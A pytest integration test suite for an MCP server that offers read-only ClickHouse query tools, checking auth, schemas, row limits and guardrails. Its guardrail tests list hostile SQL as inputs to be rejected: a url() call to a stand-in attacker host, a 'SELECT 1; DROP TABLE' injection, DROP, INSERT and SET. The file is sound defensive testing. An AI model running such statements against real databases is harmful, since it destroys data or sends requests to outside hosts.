"""Integration tests for the live MCP server at IT_MCP_URL.

Every test is marked ``@pytest.mark.integration`` and auto-skips unless both
the RUN_INTEGRATION env var is set and the REST /health endpoint is reachable.

Coverage
--------
MCP tools (6): listDatabases, listTables, getTableSchema, sampleRows,
               runQuery, explainQuery

- list_tools returns the 6 expected tool names
- listDatabases — it_integration appears in the list
- listTables — orders + customers appear for it_integration
- getTableSchema — exact column names and types for orders
- getTableSchema on ghost table — isError with TABLE_NOT_FOUND
- sampleRows — limit behaviour (default 5, custom 2, never > requested)
- runQuery — aggregate equals ground truth, body limit, auto-LIMIT injection
- runQuery guardrails — INSERT / url() / multi-statement / DROP / SET all
  return isError with the right code in content[0].text
- runQuery unknown table — isError, content[0].text contains CLICKHOUSE_QUERY_ERROR
  and UNKNOWN_TABLE
- explainQuery — returns a plan (contains "ReadFromMergeTree"), does not execute
- explainQuery on invalid SQL — isError
- explainQuery on DROP — isError with DISALLOWED_STATEMENT_TYPE

Raw HTTP auth tests (no SDK):
- POST /mcp without Bearer returns 401
- GET /health on :18090 returns 200 with no auth

Async tests use ``@pytest.mark.anyio`` with the session-scoped ``anyio_backend``
fixture (returning "asyncio") defined in conftest.py.
"""

from __future__ import annotations

import pytest

from tests.integration.conftest import (
    IT_API_KEY,
    IT_MCP_HEALTH,
    IT_MCP_URL,
    mcp_call,
    structured,
)


# ---------------------------------------------------------------------------
# Raw HTTP auth — no MCP SDK involved
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestMcpRawHttpAuth:

    def test_post_mcp_without_bearer_returns_401(self, seed: dict) -> None:
        """A POST to /mcp with no Authorization header must be rejected with 401."""
        import httpx

        # Extract base URL from IT_MCP_URL (strip /mcp path)
        base = IT_MCP_URL.rsplit("/mcp", 1)[0]
        resp = httpx.post(f"{base}/mcp", timeout=5.0)
        assert resp.status_code == 401, (
            f"Expected 401 without auth, got {resp.status_code}: {resp.text}"
        )

    def test_post_mcp_with_wrong_bearer_returns_401(self, seed: dict) -> None:
        import httpx

        base = IT_MCP_URL.rsplit("/mcp", 1)[0]
        resp = httpx.post(
            f"{base}/mcp",
            headers={"Authorization": "Bearer totally-wrong-key"},
            timeout=5.0,
        )
        assert resp.status_code == 401

    def test_health_on_mcp_port_returns_200_without_auth(self, seed: dict) -> None:
        """GET /health on the MCP port must be available without any auth."""
        import httpx

        resp = httpx.get(IT_MCP_HEALTH, timeout=5.0)
        assert resp.status_code == 200, (
            f"Expected 200 from MCP /health, got {resp.status_code}: {resp.text}"
        )


# ---------------------------------------------------------------------------
# list_tools
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestListTools:

    @pytest.mark.anyio
    async def test_list_tools_returns_six_expected_names(self, seed: dict) -> None:
        from mcp import ClientSession
        from mcp.client.streamable_http import streamablehttp_client

        expected = {
            "listDatabases", "listTables", "getTableSchema",
            "sampleRows", "runQuery", "explainQuery",
        }

        async with streamablehttp_client(
            IT_MCP_URL,
            headers={"Authorization": f"Bearer {IT_API_KEY}"},
        ) as (read, write, _):
            async with ClientSession(read, write) as session:
                await session.initialize()
                tools = await session.list_tools()
                names = {t.name for t in tools.tools}

        assert names == expected, (
            f"Expected tools {expected}, got {names}"
        )


# ---------------------------------------------------------------------------
# listDatabases
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestListDatabases:

    @pytest.mark.anyio
    async def test_list_databases_contains_it_integration(self, seed: dict) -> None:
        res = await mcp_call("listDatabases", {})
        assert not res.isError, f"listDatabases returned error: {res}"
        dbs = structured(res)
        assert isinstance(dbs, list)
        names = [item["name"] for item in dbs]
        assert seed["database"] in names, (
            f"'{seed['database']}' not found in databases: {names}"
        )

    @pytest.mark.anyio
    async def test_list_databases_each_item_has_name(self, seed: dict) -> None:
        res = await mcp_call("listDatabases", {})
        for item in structured(res):
            assert "name" in item


# ---------------------------------------------------------------------------
# listTables
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestListTables:

    @pytest.mark.anyio
    async def test_list_tables_contains_orders_and_customers(self, seed: dict) -> None:
        res = await mcp_call("listTables", {"database": seed["database"]})
        assert not res.isError, f"listTables returned error: {res}"
        tables = structured(res)
        names = {item["name"] for item in tables}
        assert seed["orders_table"] in names
        assert seed["customers_table"] in names

    @pytest.mark.anyio
    async def test_list_tables_items_have_correct_shape(self, seed: dict) -> None:
        res = await mcp_call("listTables", {"database": seed["database"]})
        for item in structured(res):
            assert {"database", "name", "engine"} <= set(item.keys())
            assert item["database"] == seed["database"]


# ---------------------------------------------------------------------------
# getTableSchema
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestGetTableSchema:

    @pytest.mark.anyio
    async def test_orders_schema_has_correct_columns(self, seed: dict) -> None:
        res = await mcp_call(
            "getTableSchema",
            {"database": seed["database"], "table": seed["orders_table"]},
        )
        assert not res.isError, f"getTableSchema error: {res.content[0].text if res.content else res}"
        schema = structured(res)
        assert schema["database"] == seed["database"]
        assert schema["table"] == seed["orders_table"]

        col_map = {c["name"]: c["type"] for c in schema["columns"]}
        for expected in seed["orders_columns"]:
            assert expected["name"] in col_map, (
                f"Column '{expected['name']}' missing; got {list(col_map)}"
            )
            assert col_map[expected["name"]] == expected["type"], (
                f"Column '{expected['name']}': expected '{expected['type']}', "
                f"got '{col_map[expected['name']]}'"
            )

    @pytest.mark.anyio
    async def test_orders_schema_column_count(self, seed: dict) -> None:
        res = await mcp_call(
            "getTableSchema",
            {"database": seed["database"], "table": seed["orders_table"]},
        )
        schema = structured(res)
        assert len(schema["columns"]) == len(seed["orders_columns"])

    @pytest.mark.anyio
    async def test_schema_on_ghost_table_returns_is_error(self, seed: dict) -> None:
        res = await mcp_call(
            "getTableSchema",
            {"database": seed["database"], "table": "ghost_table_xyz_9999"},
        )
        assert res.isError is True

    @pytest.mark.anyio
    async def test_schema_on_ghost_table_error_contains_table_not_found(self, seed: dict) -> None:
        res = await mcp_call(
            "getTableSchema",
            {"database": seed["database"], "table": "ghost_table_xyz_9999"},
        )
        assert res.isError is True
        error_text = res.content[0].text if res.content else ""
        assert "TABLE_NOT_FOUND" in error_text, (
            f"Expected TABLE_NOT_FOUND in error; got: {error_text!r}"
        )


# ---------------------------------------------------------------------------
# sampleRows
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestSampleRows:

    @pytest.mark.anyio
    async def test_sample_rows_returns_correct_shape(self, seed: dict) -> None:
        res = await mcp_call(
            "sampleRows",
            {"database": seed["database"], "table": seed["orders_table"], "limit": 3},
        )
        assert not res.isError
        data = structured(res)
        assert {"columns", "rows", "row_count", "truncated"} == set(data.keys())

    @pytest.mark.anyio
    async def test_sample_rows_respects_limit(self, seed: dict) -> None:
        res = await mcp_call(
            "sampleRows",
            {"database": seed["database"], "table": seed["orders_table"], "limit": 2},
        )
        data = structured(res)
        assert data["row_count"] <= 2
        assert len(data["rows"]) == data["row_count"]

    @pytest.mark.anyio
    async def test_sample_rows_default_limit_is_5(self, seed: dict) -> None:
        """Default sampleRows limit is 5; our table has 6 rows."""
        res = await mcp_call(
            "sampleRows",
            {"database": seed["database"], "table": seed["orders_table"]},
        )
        data = structured(res)
        assert data["row_count"] <= 5

    @pytest.mark.anyio
    async def test_sample_rows_includes_expected_columns(self, seed: dict) -> None:
        res = await mcp_call(
            "sampleRows",
            {"database": seed["database"], "table": seed["orders_table"]},
        )
        data = structured(res)
        expected_cols = {c["name"] for c in seed["orders_columns"]}
        assert expected_cols <= set(data["columns"])


# ---------------------------------------------------------------------------
# runQuery
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestRunQuery:

    @pytest.mark.anyio
    async def test_count_aggregate_equals_ground_truth(self, seed: dict) -> None:
        res = await mcp_call(
            "runQuery",
            {"sql": f"SELECT count() as cnt FROM {seed['database']}.{seed['orders_table']}"},
        )
        assert not res.isError
        data = structured(res)
        assert data["columns"] == ["cnt"]
        assert data["rows"][0][0] == seed["orders_count"]

    @pytest.mark.anyio
    async def test_sum_amount_equals_ground_truth(self, seed: dict) -> None:
        # Use the raw aggregate — the API serializes Decimal(10,2) as a string
        # with 2 decimal places ("605.50"), matching GROUND_TRUTH exactly.
        # Avoid toString() which strips trailing zeros in ClickHouse.
        res = await mcp_call(
            "runQuery",
            {
                "sql": (
                    f"SELECT sum(amount) as total "
                    f"FROM {seed['database']}.{seed['orders_table']}"
                )
            },
        )
        assert not res.isError
        data = structured(res)
        assert data["rows"][0][0] == seed["orders_sum_amount"]

    @pytest.mark.anyio
    async def test_max_amount_equals_ground_truth(self, seed: dict) -> None:
        # Use the raw aggregate — Decimal(10,2) is serialized as "200.00".
        res = await mcp_call(
            "runQuery",
            {
                "sql": (
                    f"SELECT max(amount) as mx "
                    f"FROM {seed['database']}.{seed['orders_table']}"
                )
            },
        )
        assert not res.isError
        data = structured(res)
        assert data["rows"][0][0] == seed["orders_max_amount"]

    @pytest.mark.anyio
    async def test_auto_limit_is_injected(self, seed: dict) -> None:
        """A query with no LIMIT should succeed; all 6 rows fit in the default cap."""
        res = await mcp_call(
            "runQuery",
            {"sql": f"SELECT order_id FROM {seed['database']}.{seed['orders_table']}"},
        )
        assert not res.isError
        data = structured(res)
        assert data["row_count"] == seed["orders_count"]

    @pytest.mark.anyio
    async def test_limit_argument_caps_rows(self, seed: dict) -> None:
        res = await mcp_call(
            "runQuery",
            {
                "sql": f"SELECT order_id FROM {seed['database']}.{seed['orders_table']}",
                "limit": 2,
            },
        )
        assert not res.isError
        data = structured(res)
        assert data["row_count"] == 2

    @pytest.mark.anyio
    async def test_response_shape(self, seed: dict) -> None:
        res = await mcp_call(
            "runQuery",
            {
                "sql": (
                    f"SELECT order_id FROM {seed['database']}.{seed['orders_table']} LIMIT 1"
                )
            },
        )
        assert not res.isError
        data = structured(res)
        assert set(data.keys()) == {"columns", "rows", "row_count", "truncated"}

    # --- Guardrail tests ---

    @pytest.mark.parametrize("bad_sql, expected_code", [
        (
            "INSERT INTO it_integration.orders VALUES (99, 'X', 'XX', 1.0, now())",
            "DISALLOWED_STATEMENT_TYPE",
        ),
        (
            "SELECT * FROM url('http://attacker.example/', 'CSV', 'x Int32')",
            "DISALLOWED_KEYWORD",
        ),
        (
            "SELECT 1; DROP TABLE it_integration.orders",
            "MULTIPLE_STATEMENTS",
        ),
        (
            "DROP TABLE it_integration.orders",
            "DISALLOWED_STATEMENT_TYPE",
        ),
        (
            "SET max_threads=1",
            "DISALLOWED_STATEMENT_TYPE",
        ),
    ])
    @pytest.mark.anyio
    async def test_guardrail_returns_is_error_with_correct_code(
        self, seed: dict, bad_sql: str, expected_code: str
    ) -> None:
        res = await mcp_call("runQuery", {"sql": bad_sql})
        assert res.isError is True, (
            f"Expected isError=True for {bad_sql!r}, got isError={res.isError}"
        )
        error_text = res.content[0].text if res.content else ""
        assert f"[{expected_code}]" in error_text, (
            f"Expected '[{expected_code}]' in error text; got: {error_text!r}"
        )

    @pytest.mark.anyio
    async def test_unknown_table_returns_is_error(self, seed: dict) -> None:
        res = await mcp_call(
            "runQuery",
            {"sql": f"SELECT * FROM {seed['database']}.no_such_table_xyz_9999"},
        )
        assert res.isError is True

    @pytest.mark.anyio
    async def test_unknown_table_error_contains_clickhouse_query_error(self, seed: dict) -> None:
        res = await mcp_call(
            "runQuery",
            {"sql": f"SELECT * FROM {seed['database']}.no_such_table_xyz_9999"},
        )
        error_text = res.content[0].text if res.content else ""
        assert "[CLICKHOUSE_QUERY_ERROR]" in error_text, (
            f"Expected [CLICKHOUSE_QUERY_ERROR] in text; got: {error_text!r}"
        )

    @pytest.mark.anyio
    async def test_unknown_table_error_contains_unknown_table(self, seed: dict) -> None:
        res = await mcp_call(
            "runQuery",
            {"sql": f"SELECT * FROM {seed['database']}.no_such_table_xyz_9999"},
        )
        error_text = res.content[0].text if res.content else ""
        assert "UNKNOWN_TABLE" in error_text, (
            f"Expected UNKNOWN_TABLE in error text; got: {error_text!r}"
        )


# ---------------------------------------------------------------------------
# explainQuery
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestExplainQuery:

    @pytest.mark.anyio
    async def test_explain_returns_plan_rows(self, seed: dict) -> None:
        res = await mcp_call(
            "explainQuery",
            {"sql": f"SELECT * FROM {seed['database']}.{seed['orders_table']} LIMIT 5"},
        )
        assert not res.isError
        data = structured(res)
        assert data["row_count"] > 0
        assert len(data["rows"]) > 0

    @pytest.mark.anyio
    async def test_explain_plan_contains_read_from_merge_tree(self, seed: dict) -> None:
        res = await mcp_call(
            "explainQuery",
            {"sql": f"SELECT * FROM {seed['database']}.{seed['orders_table']} LIMIT 5"},
        )
        data = structured(res)
        all_text = " ".join(str(row[0]) for row in data["rows"])
        assert "ReadFromMergeTree" in all_text, (
            f"Expected 'ReadFromMergeTree' in EXPLAIN; got: {all_text!r}"
        )

    @pytest.mark.anyio
    async def test_explain_truncated_always_false(self, seed: dict) -> None:
        res = await mcp_call(
            "explainQuery",
            {"sql": f"SELECT * FROM {seed['database']}.{seed['orders_table']} LIMIT 5"},
        )
        data = structured(res)
        assert data["truncated"] is False

    @pytest.mark.anyio
    async def test_explain_does_not_change_row_count(self, seed: dict) -> None:
        """EXPLAIN must not execute the query; count should remain ground truth."""
        await mcp_call(
            "explainQuery",
            {"sql": f"SELECT * FROM {seed['database']}.{seed['orders_table']}"},
        )
        # Verify data is still intact
        res2 = await mcp_call(
            "runQuery",
            {"sql": f"SELECT count() FROM {seed['database']}.{seed['orders_table']}"},
        )
        data = structured(res2)
        assert data["rows"][0][0] == seed["orders_count"]

    @pytest.mark.anyio
    async def test_explain_on_drop_returns_is_error_disallowed_statement(
        self, seed: dict
    ) -> None:
        res = await mcp_call(
            "explainQuery",
            {"sql": "DROP TABLE it_integration.orders"},
        )
        assert res.isError is True
        error_text = res.content[0].text if res.content else ""
        assert "[DISALLOWED_STATEMENT_TYPE]" in error_text, (
            f"Expected [DISALLOWED_STATEMENT_TYPE]; got: {error_text!r}"
        )

    @pytest.mark.anyio
    async def test_explain_on_invalid_sql_returns_is_error(self, seed: dict) -> None:
        """A completely non-SQL string must be rejected by the guardrail."""
        res = await mcp_call(
            "explainQuery",
            {"sql": "THIS IS NOT SQL AT ALL !!!"},
        )
        assert res.isError is True
